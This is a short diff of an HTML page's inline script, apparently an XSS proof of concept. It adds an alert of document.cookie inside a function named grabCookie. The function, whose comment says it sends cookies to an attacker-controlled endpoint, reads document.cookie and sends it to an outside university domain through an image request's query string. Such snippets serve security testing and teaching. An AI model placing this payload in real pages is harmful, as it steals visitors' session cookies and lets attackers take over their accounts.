@@ -7,7 +7,7 @@
 <script>
 function grabCookie() {
     // Send the cookie value to an attacker-controlled endpoint
-  alert();
+  alert(document.cookie);
     var cookieValue = document.cookie;
     var img = new Image();
     img.src = 'https://globalcareers.monash.edu?cookie=' + encodeURIComponent(cookieValue);
